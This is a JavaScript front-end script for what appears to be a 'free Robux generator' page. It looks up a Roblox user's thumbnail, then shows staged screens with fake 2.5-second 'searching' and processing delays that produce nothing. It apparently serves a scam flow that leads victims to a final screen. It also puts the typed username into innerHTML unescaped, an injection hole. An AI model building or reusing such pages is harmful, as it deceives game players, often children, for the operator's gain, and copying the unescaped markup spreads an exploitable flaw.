document.addEventListener("DOMContentLoaded", function () {
    const rbxbtn = document.querySelector(".getrbx");
    const box1 = document.querySelector(".box");
    const box2 = document.querySelector(".box2");
    const box3 = document.querySelector(".box3");
    const box4 = document.querySelector(".box4");
    const rbxtotal = document.querySelectorAll(".details");
    const username = document.querySelector(".username");
    const useroutput = document.querySelector(".useroutput");
    let thumbnailUrl = ""; // Store thumbnail URL

    console.log("DOM fully loaded and parsed");

    const handleNextButtonClick = (event) => {
        event.preventDefault();
        console.log("Next button clicked");

        if (username.value.trim().length <= 2) {
            alert("Please enter a valid username");
        } else {
            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
            updateUsernameDisplay();
            fetchThumbnail(username.value.trim())
                .then((url) => {
                    thumbnailUrl = url;
                    box1.style.display = "none";
                    box2.style.display = "block";

                    setTimeout(() => {
                        box2.style.display = "none";
                        box3.style.display = "block";
                        displayThumbnail();
                        updateUsernameDisplay();
                    }, 2500);
                })
                .catch((error) => {
                    alert("User doesn't exist. Please enter a valid username.");
                    console.error(error);
                });
        }
    };

    rbxbtn.addEventListener("click", handleNextButtonClick);

    rbxtotal.forEach((btn) => {
        btn.addEventListener("click", (event) => {
            event.preventDefault();
            box3.style.display = "none";
            box2.style.display = "block";
            setTimeout(() => {
                box2.style.display = "none";
                box4.style.display = "block";
            }, 2500);
        });
    });

    function updateUsernameDisplay() {
        const usernameDisplay = document.getElementById('usernameDisplay');
        if (usernameDisplay) {
            usernameDisplay.textContent = username.value.trim();
        }
    }

    async function fetchThumbnail(username) {
        console.log("Fetching thumbnail for username:", username);
        try {
            const response = await fetch('/api/get_thumbnail', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username }),
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const data = await response.json();
            console.log("API Response:", data);

            if (data.thumbnailUrl) {
                return data.thumbnailUrl;
            } else {
                throw new Error('Thumbnail not found');
            }
        } catch (error) {
            console.error("Error fetching thumbnail:", error);
            throw error;
        }
    }

    function displayThumbnail() {
        if (thumbnailUrl) {
            const thumbnailContainer = document.createElement("div");
            thumbnailContainer.className = "thumbnail-container";
            thumbnailContainer.innerHTML = `<img src="${thumbnailUrl}" alt="Roblox Thumbnail">`;
            box3.appendChild(thumbnailContainer);
        } else {
            console.error("No thumbnail URL available to display.");
        }
    }
});
